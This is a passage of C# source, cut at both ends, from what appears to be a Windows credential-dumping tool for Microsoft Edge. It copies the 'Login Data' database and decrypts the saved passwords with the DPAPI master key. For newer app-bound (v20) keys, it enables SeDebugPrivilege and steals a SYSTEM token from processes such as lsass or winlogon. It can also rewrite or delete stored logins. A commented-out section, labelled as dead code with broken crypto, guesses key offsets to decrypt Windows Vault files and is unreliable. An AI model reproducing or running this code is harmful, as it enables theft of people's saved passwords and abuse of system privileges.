                    EncryptionVersion = GetEncryptionVersion(passwordBlob)
                });
            }
        }
        finally
        {
            if (stmt != IntPtr.Zero)
                sqlite3_finalize(stmt);

            if (db != IntPtr.Zero)
                sqlite3_close(db);

            SafeDeleteFile(tempPath);
            SafeDeleteFile(tempWalPath);
            SafeDeleteFile(tempShmPath);
        }

        return credentials;
    }

    private static string CreateTempCopyPath(string prefix, string extension)
    {
        return Path.Combine(Path.GetTempPath(), prefix + Guid.NewGuid().ToString("N") + extension);
    }

    private static void SafeDeleteFile(string path)
    {
        try
        {
            if (!string.IsNullOrEmpty(path) && File.Exists(path))
                File.Delete(path);
        }
        catch
        {
        }
    }

    private static string GetSqliteError(IntPtr db, int code)
    {
        if (db == IntPtr.Zero)
            return "SQLite error " + code.ToString();

        IntPtr errorPtr = sqlite3_errmsg16(db);
        string detail = errorPtr != IntPtr.Zero ? Marshal.PtrToStringUni(errorPtr) : null;
        if (string.IsNullOrEmpty(detail))
            detail = "SQLite error " + code.ToString();

        return detail;
    }

    private static string GetColumnText(IntPtr stmt, int columnIndex)
    {
        IntPtr textPtr = sqlite3_column_text16(stmt, columnIndex);
        return textPtr == IntPtr.Zero ? string.Empty : Marshal.PtrToStringUni(textPtr);
    }

    private static byte[] GetColumnBlob(IntPtr stmt, int columnIndex)
    {
        int length = sqlite3_column_bytes(stmt, columnIndex);
        if (length <= 0)
            return new byte[0];

        IntPtr blobPtr = sqlite3_column_blob(stmt, columnIndex);
        if (blobPtr == IntPtr.Zero)
            return new byte[0];

        byte[] buffer = new byte[length];
        Marshal.Copy(blobPtr, buffer, 0, length);
        return buffer;
    }

    private static string GetEncryptionVersion(byte[] blob)
    {
        if (blob == null || blob.Length == 0)
            return "EMPTY";

        if (blob.Length >= 3)
        {
            string marker = Encoding.ASCII.GetString(blob, 0, 3);
            if (string.Equals(marker, "v10", StringComparison.Ordinal)
                || string.Equals(marker, "v11", StringComparison.Ordinal)
                || string.Equals(marker, "v20", StringComparison.Ordinal))
            {
                return marker;
            }
        }

        return "dpapi/raw";
    }

    private static string GetProfileDisplayName(EdgeLocalStateInfo localState, string directoryName)
    {
        if (localState != null && localState.ProfileDisplayNames.ContainsKey(directoryName))
            return localState.ProfileDisplayNames[directoryName];

        return directoryName;
    }

    private static EdgeLocalStateInfo LoadLocalState(string userDataPath)
    {
        EdgeLocalStateInfo state = new EdgeLocalStateInfo();
        string localStatePath = Path.Combine(userDataPath, "Local State");
        if (!File.Exists(localStatePath))
        {
            state.MasterKeyError = "Local State file not found.";
            return state;
        }

        try
        {
            string text = File.ReadAllText(localStatePath);
            JavaScriptSerializer serializer = new JavaScriptSerializer();
            serializer.MaxJsonLength = Math.Max(serializer.MaxJsonLength, text.Length + 1024);

            object rootObject = serializer.DeserializeObject(text);
            Dictionary<string, object> root = rootObject as Dictionary<string, object>;
            if (root == null)
            {
                state.MasterKeyError = "Local State JSON root was not an object.";
                return state;
            }

            Dictionary<string, object> osCrypt = GetDictionary(root, "os_crypt");
            if (osCrypt != null)
            {
                string encryptedKey = GetString(osCrypt, "encrypted_key");
                if (!string.IsNullOrEmpty(encryptedKey))
                {
                    try
                    {
                        state.MasterKey = DecodeMasterKey(encryptedKey);
                    }
                    catch (Exception ex)
                    {
                        state.MasterKeyError = ex.Message;
                    }
                }
                else
                {
                    state.MasterKeyError = "os_crypt.encrypted_key missing from Local State.";
                }

                string appBoundEncryptedKey = GetString(osCrypt, "app_bound_encrypted_key");
                if (!string.IsNullOrEmpty(appBoundEncryptedKey))
                {
                    try
                    {
                        state.AppBoundKey = DecodeAppBoundKey(appBoundEncryptedKey);
                    }
                    catch (Exception ex)
                    {
                        state.AppBoundKeyError = ex.Message;
                    }
                }
                else
                {
                    state.AppBoundKeyError = "os_crypt.app_bound_encrypted_key missing from Local State.";
                }
            }
            else
            {
                state.MasterKeyError = "os_crypt missing from Local State.";
                state.AppBoundKeyError = "os_crypt missing from Local State.";
            }

            Dictionary<string, object> profile = GetDictionary(root, "profile");
            Dictionary<string, object> infoCache = GetDictionary(profile, "info_cache");
            if (infoCache != null)
            {
                foreach (KeyValuePair<string, object> entry in infoCache)
                {
                    Dictionary<string, object> profileInfo = entry.Value as Dictionary<string, object>;
                    if (profileInfo == null)
                        continue;

                    string displayName = GetString(profileInfo, "name");
                    if (!string.IsNullOrEmpty(displayName))
                        state.ProfileDisplayNames[entry.Key] = displayName;
                }
            }
        }
        catch (Exception ex)
        {
            state.MasterKeyError = ex.Message;
        }

        return state;
    }

    private static Dictionary<string, object> GetDictionary(Dictionary<string, object> parent, string key)
    {
        if (parent == null || string.IsNullOrEmpty(key) || !parent.ContainsKey(key))
            return null;

        return parent[key] as Dictionary<string, object>;
    }

    private static string GetString(Dictionary<string, object> parent, string key)
    {
        if (parent == null || string.IsNullOrEmpty(key) || !parent.ContainsKey(key) || parent[key] == null)
            return null;

        return parent[key] as string;
    }

    private static byte[] DecodeMasterKey(string encryptedKey)
    {
        byte[] raw = Convert.FromBase64String(encryptedKey);
        if (raw.Length < 6)
            throw new InvalidOperationException("Local State encrypted_key was too short.");

        string prefix = Encoding.ASCII.GetString(raw, 0, 5);
        if (!string.Equals(prefix, "DPAPI", StringComparison.Ordinal))
            throw new InvalidOperationException("Local State encrypted_key missing DPAPI prefix.");

        byte[] protectedBytes = new byte[raw.Length - 5];
        Buffer.BlockCopy(raw, 5, protectedBytes, 0, protectedBytes.Length);
        return DpapiUnprotect(protectedBytes);
    }

    private static string DecryptPassword(byte[] blob, EdgeLocalStateInfo localState)
    {
        if (blob == null || blob.Length == 0)
            return string.Empty;

        string version = GetEncryptionVersion(blob);
        if (string.Equals(version, "v10", StringComparison.Ordinal) || string.Equals(version, "v11", StringComparison.Ordinal))
        {
            if (localState == null || localState.MasterKey == null || localState.MasterKey.Length == 0)
            {
                return string.IsNullOrEmpty(localState != null ? localState.MasterKeyError : null)
                    ? "[Master key unavailable]"
                    : "[Master key unavailable: " + localState.MasterKeyError + "]";
            }

            try
            {
                return DecryptAesGcmPassword(blob, localState.MasterKey);
            }
            catch (Exception ex)
            {
                return "[Decrypt failed: " + ex.Message + "]";
            }
        }

        if (string.Equals(version, "v20", StringComparison.Ordinal))
        {
            if (localState == null || localState.AppBoundKey == null || localState.AppBoundKey.Length == 0)
            {
                return string.IsNullOrEmpty(localState != null ? localState.AppBoundKeyError : null)
                    ? "[v20 app-bound key unavailable]"
                    : "[v20: " + localState.AppBoundKeyError + "]";
            }

            try
            {
                return DecryptAesGcmPassword(blob, localState.AppBoundKey);
            }
            catch (Exception ex)
            {
                return "[v20 decrypt failed: " + ex.Message + "]";
            }
        }

        try
        {
            return DecodePasswordBytes(DpapiUnprotect(blob));
        }
        catch (Exception ex)
        {
            return "[DPAPI decrypt failed: " + ex.Message + "]";
        }
    }

    private static string DecryptAesGcmPassword(byte[] blob, byte[] masterKey)
    {
        if (blob.Length < 3 + 12 + 16)
            throw new InvalidOperationException("Encrypted blob was too short.");

        byte[] nonce = new byte[12];
        Buffer.BlockCopy(blob, 3, nonce, 0, nonce.Length);

        int cipherLength = blob.Length - 3 - nonce.Length - 16;
        if (cipherLength < 0)
            throw new InvalidOperationException("Encrypted blob length was invalid.");

        byte[] cipherText = new byte[cipherLength];
        Buffer.BlockCopy(blob, 15, cipherText, 0, cipherText.Length);

        byte[] tag = new byte[16];
        Buffer.BlockCopy(blob, 15 + cipherText.Length, tag, 0, tag.Length);

        IntPtr algorithm = IntPtr.Zero;
        IntPtr key = IntPtr.Zero;
        byte[] keyObject = null;
        GCHandle nonceHandle = default(GCHandle);
        GCHandle tagHandle = default(GCHandle);

        try
        {
            int status = BCryptOpenAlgorithmProvider(out algorithm, "AES", null, 0);
            if (status != 0)
                throw new InvalidOperationException("BCryptOpenAlgorithmProvider failed: 0x" + status.ToString("X8"));

            byte[] chainingMode = Encoding.Unicode.GetBytes("ChainingModeGCM\0");
            status = BCryptSetProperty(algorithm, "ChainingMode", chainingMode, chainingMode.Length, 0);
            if (status != 0)
                throw new InvalidOperationException("BCryptSetProperty(ChainingModeGCM) failed: 0x" + status.ToString("X8"));

            int objectLength = GetBcryptIntProperty(algorithm, "ObjectLength");
            keyObject = new byte[objectLength];

            status = BCryptGenerateSymmetricKey(algorithm, out key, keyObject, keyObject.Length, masterKey, masterKey.Length, 0);
            if (status != 0)
                throw new InvalidOperationException("BCryptGenerateSymmetricKey failed: 0x" + status.ToString("X8"));

            nonceHandle = GCHandle.Alloc(nonce, GCHandleType.Pinned);
            tagHandle = GCHandle.Alloc(tag, GCHandleType.Pinned);

            BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo = new BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO();
            authInfo.cbSize = Marshal.SizeOf(typeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO));
            authInfo.dwInfoVersion = 1;
            authInfo.pbNonce = nonceHandle.AddrOfPinnedObject();
            authInfo.cbNonce = nonce.Length;
            authInfo.pbTag = tagHandle.AddrOfPinnedObject();
            authInfo.cbTag = tag.Length;
            authInfo.pbAuthData = IntPtr.Zero;
            authInfo.cbAuthData = 0;
            authInfo.pbMacContext = IntPtr.Zero;
            authInfo.cbMacContext = 0;
            authInfo.cbAAD = 0;
            authInfo.cbData = 0;
            authInfo.dwFlags = 0;

            byte[] plainText = new byte[cipherText.Length];
            int resultSize;
            status = BCryptDecrypt(key, cipherText, cipherText.Length, ref authInfo, null, 0, plainText, plainText.Length, out resultSize, 0);
            if (status != 0)
                throw new InvalidOperationException("BCryptDecrypt failed: 0x" + status.ToString("X8"));

            if (resultSize != plainText.Length)
            {
                byte[] resized = new byte[resultSize];
                Buffer.BlockCopy(plainText, 0, resized, 0, resultSize);
                plainText = resized;
            }

            return DecodePasswordBytes(plainText);
        }
        finally
        {
            if (nonceHandle.IsAllocated)
                nonceHandle.Free();

            if (tagHandle.IsAllocated)
                tagHandle.Free();

            if (key != IntPtr.Zero)
                BCryptDestroyKey(key);

            if (algorithm != IntPtr.Zero)
                BCryptCloseAlgorithmProvider(algorithm, 0);
        }
    }

    private static int GetBcryptIntProperty(IntPtr handle, string propertyName)
    {
        byte[] buffer = new byte[4];
        int resultSize;
        int status = BCryptGetProperty(handle, propertyName, buffer, buffer.Length, out resultSize, 0);
        if (status != 0)
            throw new InvalidOperationException("BCryptGetProperty(" + propertyName + ") failed: 0x" + status.ToString("X8"));

        return BitConverter.ToInt32(buffer, 0);
    }

    private static string GetUserDataPathFromProfile(string profilePath)
    {
        DirectoryInfo directory = Directory.GetParent(profilePath);
        if (directory == null)
            throw new InvalidOperationException("Could not resolve the Edge User Data directory.");

        return directory.FullName;
    }

    private static void ExecuteCredentialUpdate(string profilePath, long loginId, string username, byte[] encryptedPassword)
    {
        IntPtr db = IntPtr.Zero;
        IntPtr stmt = IntPtr.Zero;
        try
        {
            string loginDataPath = Path.Combine(profilePath, "Login Data");
            int openResult = sqlite3_open16(loginDataPath, out db);
            if (openResult != SQLITE_OK || db == IntPtr.Zero)
                throw new InvalidOperationException("sqlite3_open16 failed: " + GetSqliteError(db, openResult));

            string sql = "UPDATE logins SET username_value = ?1, password_value = ?2 WHERE id = ?3";
            int prepareResult = sqlite3_prepare16_v2(db, sql, -1, out stmt, IntPtr.Zero);
            if (prepareResult != SQLITE_OK || stmt == IntPtr.Zero)
                throw new InvalidOperationException("sqlite3_prepare16_v2 failed: " + GetSqliteError(db, prepareResult));

            int bindResult = sqlite3_bind_text16(stmt, 1, username ?? string.Empty, -1, SQLITE_TRANSIENT);
            if (bindResult != SQLITE_OK)
                throw new InvalidOperationException("sqlite3_bind_text16 failed: " + GetSqliteError(db, bindResult));

            byte[] passwordBytes = encryptedPassword ?? new byte[0];
            bindResult = sqlite3_bind_blob(stmt, 2, passwordBytes, passwordBytes.Length, SQLITE_TRANSIENT);
            if (bindResult != SQLITE_OK)
                throw new InvalidOperationException("sqlite3_bind_blob failed: " + GetSqliteError(db, bindResult));

            bindResult = sqlite3_bind_int64(stmt, 3, loginId);
            if (bindResult != SQLITE_OK)
                throw new InvalidOperationException("sqlite3_bind_int64 failed: " + GetSqliteError(db, bindResult));

            int stepResult = sqlite3_step(stmt);
            if (stepResult != SQLITE_DONE)
                throw new InvalidOperationException("sqlite3_step failed: " + GetSqliteError(db, stepResult));
        }
        finally
        {
            if (stmt != IntPtr.Zero)
            {
                sqlite3_reset(stmt);
                sqlite3_finalize(stmt);
            }

            if (db != IntPtr.Zero)
                sqlite3_close(db);
        }
    }

    private static void ExecuteCredentialDelete(string profilePath, long loginId)
    {
        IntPtr db = IntPtr.Zero;
        IntPtr stmt = IntPtr.Zero;
        try
        {
            string loginDataPath = Path.Combine(profilePath, "Login Data");
            int openResult = sqlite3_open16(loginDataPath, out db);
            if (openResult != SQLITE_OK || db == IntPtr.Zero)
                throw new InvalidOperationException("sqlite3_open16 failed: " + GetSqliteError(db, openResult));

            string sql = "DELETE FROM logins WHERE id = ?1";
            int prepareResult = sqlite3_prepare16_v2(db, sql, -1, out stmt, IntPtr.Zero);
            if (prepareResult != SQLITE_OK || stmt == IntPtr.Zero)
                throw new InvalidOperationException("sqlite3_prepare16_v2 failed: " + GetSqliteError(db, prepareResult));

            int bindResult = sqlite3_bind_int64(stmt, 1, loginId);
            if (bindResult != SQLITE_OK)
                throw new InvalidOperationException("sqlite3_bind_int64 failed: " + GetSqliteError(db, bindResult));

            int stepResult = sqlite3_step(stmt);
            if (stepResult != SQLITE_DONE)
                throw new InvalidOperationException("sqlite3_step failed: " + GetSqliteError(db, stepResult));
        }
        finally
        {
            if (stmt != IntPtr.Zero)
            {
                sqlite3_reset(stmt);
                sqlite3_finalize(stmt);
            }

            if (db != IntPtr.Zero)
                sqlite3_close(db);
        }
    }

    private static string DecodePasswordBytes(byte[] plainText)
    {
        if (plainText == null || plainText.Length == 0)
            return string.Empty;

        string text = Encoding.UTF8.GetString(plainText).TrimEnd('\0');
        if (!string.IsNullOrEmpty(text) && text.IndexOf('\uFFFD') < 0)
            return text;

        if ((plainText.Length % 2) == 0)
            return Encoding.Unicode.GetString(plainText).TrimEnd('\0');

        return Convert.ToBase64String(plainText);
    }

    private static byte[] EncryptPasswordV10(string plainText, byte[] masterKey)
    {
        if (masterKey == null || masterKey.Length == 0)
            throw new ArgumentNullException("masterKey");

        byte[] plainBytes = Encoding.UTF8.GetBytes(plainText ?? string.Empty);
        byte[] nonce = new byte[12];
        using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
        {
            rng.GetBytes(nonce);
        }

        IntPtr algorithm = IntPtr.Zero;
        IntPtr key = IntPtr.Zero;
        byte[] keyObject = null;
        byte[] cipherText = new byte[plainBytes.Length];
        byte[] tag = new byte[16];
        GCHandle nonceHandle = default(GCHandle);
        GCHandle tagHandle = default(GCHandle);

        try
        {
            int status = BCryptOpenAlgorithmProvider(out algorithm, "AES", null, 0);
            if (status != 0)
                throw new InvalidOperationException("BCryptOpenAlgorithmProvider failed: 0x" + status.ToString("X8"));

            byte[] chainingMode = Encoding.Unicode.GetBytes("ChainingModeGCM\0");
            status = BCryptSetProperty(algorithm, "ChainingMode", chainingMode, chainingMode.Length, 0);
            if (status != 0)
                throw new InvalidOperationException("BCryptSetProperty(ChainingModeGCM) failed: 0x" + status.ToString("X8"));

            int objectLength = GetBcryptIntProperty(algorithm, "ObjectLength");
            keyObject = new byte[objectLength];

            status = BCryptGenerateSymmetricKey(algorithm, out key, keyObject, keyObject.Length, masterKey, masterKey.Length, 0);
            if (status != 0)
                throw new InvalidOperationException("BCryptGenerateSymmetricKey failed: 0x" + status.ToString("X8"));

            nonceHandle = GCHandle.Alloc(nonce, GCHandleType.Pinned);
            tagHandle = GCHandle.Alloc(tag, GCHandleType.Pinned);

            BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo = new BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO();
            authInfo.cbSize = Marshal.SizeOf(typeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO));
            authInfo.dwInfoVersion = 1;
            authInfo.pbNonce = nonceHandle.AddrOfPinnedObject();
            authInfo.cbNonce = nonce.Length;
            authInfo.pbTag = tagHandle.AddrOfPinnedObject();
            authInfo.cbTag = tag.Length;
            authInfo.pbAuthData = IntPtr.Zero;
            authInfo.cbAuthData = 0;
            authInfo.pbMacContext = IntPtr.Zero;
            authInfo.cbMacContext = 0;
            authInfo.cbAAD = 0;
            authInfo.cbData = 0;
            authInfo.dwFlags = 0;

            int resultSize;
            status = BCryptEncrypt(key, plainBytes, plainBytes.Length, ref authInfo, null, 0, cipherText, cipherText.Length, out resultSize, 0);
            if (status != 0)
                throw new InvalidOperationException("BCryptEncrypt failed: 0x" + status.ToString("X8"));

            if (resultSize != cipherText.Length)
            {
                byte[] resized = new byte[resultSize];
                Buffer.BlockCopy(cipherText, 0, resized, 0, resultSize);
                cipherText = resized;
            }

            byte[] output = new byte[3 + nonce.Length + cipherText.Length + tag.Length];
            output[0] = (byte)'v';
            output[1] = (byte)'1';
            output[2] = (byte)'0';
            Buffer.BlockCopy(nonce, 0, output, 3, nonce.Length);
            Buffer.BlockCopy(cipherText, 0, output, 3 + nonce.Length, cipherText.Length);
            Buffer.BlockCopy(tag, 0, output, 3 + nonce.Length + cipherText.Length, tag.Length);
            return output;
        }
        finally
        {
            if (nonceHandle.IsAllocated)
                nonceHandle.Free();

            if (tagHandle.IsAllocated)
                tagHandle.Free();

            if (key != IntPtr.Zero)
                BCryptDestroyKey(key);

            if (algorithm != IntPtr.Zero)
                BCryptCloseAlgorithmProvider(algorithm, 0);
        }
    }

    private static byte[] DecodeAppBoundKey(string appBoundEncryptedKey)
    {
        byte[] raw = Convert.FromBase64String(appBoundEncryptedKey);
        if (raw.Length == 0)
            throw new InvalidOperationException("Local State app_bound_encrypted_key was empty.");

        byte[] appBoundBytes = raw;
        if (raw.Length > 4 && Encoding.ASCII.GetString(raw, 0, 4) == "APPB")
        {
            appBoundBytes = new byte[raw.Length - 4];
            Buffer.BlockCopy(raw, 4, appBoundBytes, 0, appBoundBytes.Length);
        }

        byte[] systemDecrypted = WithSystemImpersonation(delegate()
        {
            return DpapiUnprotect(appBoundBytes);
        });

        byte[] userDecrypted = DpapiUnprotect(systemDecrypted);
        return ExtractElevationKey(userDecrypted);
    }

    private static byte[] ExtractElevationKey(byte[] data)
    {
        if (data == null || data.Length < 8)
            throw new InvalidOperationException("Elevation blob was too short.");

        int validationLength = BitConverter.ToInt32(data, 0);
        int keyOffset = 4 + validationLength;
        if (data.Length < keyOffset + 4)
            throw new InvalidOperationException("Elevation blob validation data was truncated.");

        int keyLength = BitConverter.ToInt32(data, keyOffset);
        int keyStart = keyOffset + 4;
        if (data.Length < keyStart + keyLength)
            throw new InvalidOperationException("Elevation blob key data was truncated.");

        byte[] key = new byte[keyLength];
        Buffer.BlockCopy(data, keyStart, key, 0, key.Length);
        if (key.Length != 32)
            throw new InvalidOperationException("Expected 32-byte app-bound key, got " + key.Length.ToString() + " bytes.");

        return key;
    }

    private static byte[] DpapiUnprotect(byte[] data)
    {
        if (data == null)
            throw new ArgumentNullException("data");

        GCHandle inputHandle = default(GCHandle);
        DATA_BLOB dataIn = new DATA_BLOB();
        DATA_BLOB dataOut = new DATA_BLOB();
        try
        {
            inputHandle = GCHandle.Alloc(data, GCHandleType.Pinned);
            dataIn.cbData = data.Length;
            dataIn.pbData = data.Length > 0 ? inputHandle.AddrOfPinnedObject() : IntPtr.Zero;

            if (!CryptUnprotectData(ref dataIn, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0, out dataOut))
                throw new InvalidOperationException("CryptUnprotectData failed (Win32 " + Marshal.GetLastWin32Error().ToString() + ")");

            if (dataOut.pbData == IntPtr.Zero || dataOut.cbData < 0)
                throw new InvalidOperationException("CryptUnprotectData returned an empty buffer.");

            byte[] result = new byte[dataOut.cbData];
            if (result.Length > 0)
                Marshal.Copy(dataOut.pbData, result, 0, result.Length);

            return result;
        }
        finally
        {
            if (inputHandle.IsAllocated)
                inputHandle.Free();

            if (dataOut.pbData != IntPtr.Zero)
                LocalFree(dataOut.pbData);
        }
    }

    private static T WithSystemImpersonation<T>(Func<T> callback)
    {
        if (callback == null)
            throw new ArgumentNullException("callback");

        EnableSeDebugPrivilege();

        string[] preferredProcesses = new string[] { "winlogon.exe", "services.exe", "lsass.exe", "wininit.exe" };
        List<ProcessInfo> processes = SnapshotProcesses();
        IntPtr impersonationToken = IntPtr.Zero;

        foreach (string preferredProcess in preferredProcesses)
        {
            foreach (ProcessInfo process in processes)
            {
                if (!string.Equals(process.Name, preferredProcess, StringComparison.OrdinalIgnoreCase))
                    continue;

                impersonationToken = TryDuplicateSystemToken(process.ProcessId);
                if (impersonationToken != IntPtr.Zero)
                    break;
            }

            if (impersonationToken != IntPtr.Zero)
                break;
        }

        if (impersonationToken == IntPtr.Zero)
            throw new InvalidOperationException("Could not obtain a SYSTEM token from winlogon.exe, services.exe, lsass.exe, or wininit.exe.");

        try
        {
            if (!SetThreadToken(IntPtr.Zero, impersonationToken))
                throw new InvalidOperationException("SetThreadToken failed (Win32 " + Marshal.GetLastWin32Error().ToString() + ")");

            try
            {
                return callback();
            }
            finally
            {
                RevertToSelf();
            }
        }
        finally
        {
            CloseHandle(impersonationToken);
        }
    }

    private static void EnableSeDebugPrivilege()
    {
        LUID luid;
        if (!LookupPrivilegeValueW(null, "SeDebugPrivilege", out luid))
            throw new InvalidOperationException("LookupPrivilegeValueW failed (Win32 " + Marshal.GetLastWin32Error().ToString() + ")");

        IntPtr token = IntPtr.Zero;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out token))
            throw new InvalidOperationException("OpenProcessToken(self) failed (Win32 " + Marshal.GetLastWin32Error().ToString() + ")");

        try
        {
            TOKEN_PRIVILEGES privileges = new TOKEN_PRIVILEGES();
            privileges.PrivilegeCount = 1;
            privileges.Privileges = new LUID_AND_ATTRIBUTES();
            privileges.Privileges.Luid = luid;
            privileges.Privileges.Attributes = SE_PRIVILEGE_ENABLED;

            if (!AdjustTokenPrivileges(token, false, ref privileges, 0, IntPtr.Zero, IntPtr.Zero))
                throw new InvalidOperationException("AdjustTokenPrivileges failed (Win32 " + Marshal.GetLastWin32Error().ToString() + ")");

            int error = Marshal.GetLastWin32Error();
            if (error == ERROR_NOT_ALL_ASSIGNED)
                throw new InvalidOperationException("SeDebugPrivilege could not be enabled; run elevated as Administrator.");
        }
        finally
        {
            CloseHandle(token);
        }
    }

    private static List<ProcessInfo> SnapshotProcesses()
    {
        List<ProcessInfo> processes = new List<ProcessInfo>();
        IntPtr snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snapshot == IntPtr.Zero || snapshot == INVALID_HANDLE_VALUE)
            throw new InvalidOperationException("CreateToolhelp32Snapshot failed (Win32 " + Marshal.GetLastWin32Error().ToString() + ")");

        try
        {
            PROCESSENTRY32 entry = new PROCESSENTRY32();
            entry.dwSize = Marshal.SizeOf(typeof(PROCESSENTRY32));
            if (!Process32FirstW(snapshot, ref entry))
                return processes;

            do
            {
                processes.Add(new ProcessInfo { Name = entry.szExeFile, ProcessId = entry.th32ProcessID });
            }
            while (Process32NextW(snapshot, ref entry));
        }
        finally
        {
            CloseHandle(snapshot);
        }

        return processes;
    }

    private static IntPtr TryDuplicateSystemToken(int processId)
    {
        IntPtr processHandle = OpenProcess(PROCESS_QUERY_INFORMATION, false, processId);
        if (processHandle == IntPtr.Zero)
            processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, processId);

        if (processHandle == IntPtr.Zero)
            return IntPtr.Zero;

        try
        {
            return DuplicateSystemTokenFromProcessHandle(processHandle);
        }
        finally
        {
            CloseHandle(processHandle);
        }
    }

    private static IntPtr DuplicateSystemTokenFromProcessHandle(IntPtr processHandle)
    {
        IntPtr rawToken = IntPtr.Zero;
        if (!OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE, out rawToken))
            return IntPtr.Zero;

        try
        {
            IntPtr impersonationToken;
            if (!DuplicateTokenEx(rawToken, TOKEN_IMPERSONATE | TOKEN_QUERY, IntPtr.Zero, SECURITY_IMPERSONATION, TOKEN_TYPE_IMPERSONATION, out impersonationToken))
                return IntPtr.Zero;

            return impersonationToken;
        }
        finally
        {
            CloseHandle(rawToken);
        }
    }

    public static string ChromeTimeToString(long timestamp)
    {
        if (timestamp <= 0)
            return "Never";

        try
        {
            long fileTime = checked(timestamp * 10L);
            return DateTime.FromFileTimeUtc(fileTime).ToLocalTime().ToString("g");
        }
        catch
        {
            return "N/A";
        }
    }
}

// ------------------------------------------------------------------
// Windows Vault Encryption Decryption Engine
// Handles direct .vcrd file decryption using DPAPI and AES
// ------------------------------------------------------------------
public class VaultEncryptionEngine
{
    // VCRD file header constants
    private const uint VCRD_HEADER_SIZE = 16;
    private const uint POLICY_VPOL_HEADER = 4; // "DPAPI" marker plus version
    private static readonly byte[] DpapiBlobMagic = new byte[]
    {
        0xD0, 0x8C, 0x9D, 0xDF, 0x01, 0x15, 0xD1, 0x11,
        0x8C, 0x7A, 0x00, 0xC0, 0x4F, 0xC2, 0x97, 0xEB
    };

    // Vault file locations
    private static string GetVaultPath()
    {
        return Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            "Microsoft", "Vault"
        );
    }

    /* COMMENTED OUT: Dead vault decryption code with broken crypto APIs

    /// <summary>
    /// Decrypts the Policy.vpol file using DPAPI to extract AES keys
    /// </summary>
    public static byte[] DecryptPolicyFile(string vaultGuid)
    {
        string vaultPath = Path.Combine(GetVaultPath(), vaultGuid);
        string policyPath = Path.Combine(vaultPath, "Policy.vpol");

        if (!File.Exists(policyPath))
            throw new FileNotFoundException("Policy file not found: " + policyPath);

        byte[] encryptedPolicy = File.ReadAllBytes(policyPath);

        // Use DPAPI to decrypt (automatically uses user's Windows logon password as key)
        byte[] decryptedPolicy = System.Security.Cryptography.ProtectedData.Unprotect(encryptedPolicy, null, System.Security.Cryptography.DataProtectionScope.CurrentUser);

        return decryptedPolicy;
    }

    /// <summary>
    /// Extracts AES-128 and AES-256 keys from decrypted Policy.vpol
    /// The policy file structure contains:
    /// - Header (4 bytes)
    /// - Version info
    /// - Key material (two AES keys at fixed offsets)
    /// </summary>
    public static void ExtractKeysFromPolicy(byte[] decryptedPolicy, out byte[] aes128Key, out byte[] aes256Key)
    {
        // Policy file structure (empirically determined):
        // Offset 0-3: Header/version
        // Offset varies: AES-128 key (16 bytes)
        // Offset varies: AES-256 key (32 bytes)

        // Common offset positions for keys - these may vary by Windows version
        // We'll scan for key material patterns
        int aes128Offset = FindKeyOffset(decryptedPolicy, 16);
        int aes256Offset = FindKeyOffset(decryptedPolicy, 32);

        if (decryptedPolicy.Length < aes256Offset + 32)
            throw new InvalidOperationException("Policy file too small to contain encryption keys");

        aes128Key = new byte[16];
        aes256Key = new byte[32];

        Array.Copy(decryptedPolicy, aes128Offset, aes128Key, 0, 16);
        Array.Copy(decryptedPolicy, aes256Offset, aes256Key, 0, 32);
    }

    /// <summary>
    /// Finds AES key positions in policy file by analyzing structure
    /// </summary>
    private static int FindKeyOffset(byte[] data, int keySize)
    {
        // Standard offsets for different Windows versions
        if (keySize == 16) // AES-128
            return Math.Min(112, data.Length - 16);
        else // AES-256
            return Math.Min(128, data.Length - 32);
    }

    /// <summary>
    /// Decrypts a .vcrd credential file using the extracted AES key
    /// VCRD files use AES in CBC mode with PKCS7 padding
    /// </summary>
    public static string DecryptCredentialFile(string vcrdPath, byte[] aesKey, byte[] aesIv = null)
    {
        if (!File.Exists(vcrdPath))
            throw new FileNotFoundException("Credential file not found: " + vcrdPath);

        byte[] encryptedData = File.ReadAllBytes(vcrdPath);

        // Extract IV and ciphertext from VCRD file
        // VCRD format: [header(16)] [iv(16)] [encrypted_data]
        if (encryptedData.Length < 32)
            throw new InvalidOperationException("VCRD file too small");

        byte[] iv = new byte[16];
        Array.Copy(encryptedData, 16, iv, 0, 16);

        byte[] ciphertext = new byte[encryptedData.Length - 32];
        Array.Copy(encryptedData, 32, ciphertext, 0, ciphertext.Length);

        // Decrypt using AES-256-CBC (or AES-128-CBC if key size differs)
        using (var aes = System.Security.Cryptography.Aes.Create())
        {
            aes.Key = aesKey;
            aes.IV = iv;
            aes.Mode = System.Security.Cryptography.CipherMode.CBC;
            aes.Padding = System.Security.Cryptography.PaddingMode.PKCS7;

            using (var decryptor = aes.CreateDecryptor())
            {
                byte[] plaintext = decryptor.TransformFinalBlock(ciphertext, 0, ciphertext.Length);
                return Encoding.UTF8.GetString(plaintext).TrimEnd('\0');
            }
        }
    }

    /// <summary>
    /// Main method to retrieve all vault credentials by decrypting files directly
    /// </summary>
    public static List<VaultCredential> GetVaultCredentialsDirect()
    {
        List<VaultCredential> credentials = new List<VaultCredential>();

        try
        {
            string vaultBasePath = GetVaultPath();
            if (!Directory.Exists(vaultBasePath))
                return credentials;

            // Find all vault GUIDs (vault directories)
            string[] vaultDirs = Directory.GetDirectories(vaultBasePath);

            foreach (string vaultDir in vaultDirs)
            {
                string vaultGuid = Path.GetFileName(vaultDir);

                try
                {
                    // Decrypt Policy.vpol for this vault
                    byte[] decryptedPolicy = DecryptPolicyFile(vaultGuid);
                    byte[] aes128Key, aes256Key;
                    ExtractKeysFromPolicy(decryptedPolicy, out aes128Key, out aes256Key);

                    // Find all .vcrd files in this vault
                    string[] vcrdFiles = Directory.GetFiles(vaultDir, "*.vcrd");

                    foreach (string vcrdPath in vcrdFiles)
                    {
                        try
                        {
                            // Try decrypting with AES-256 first (most common)
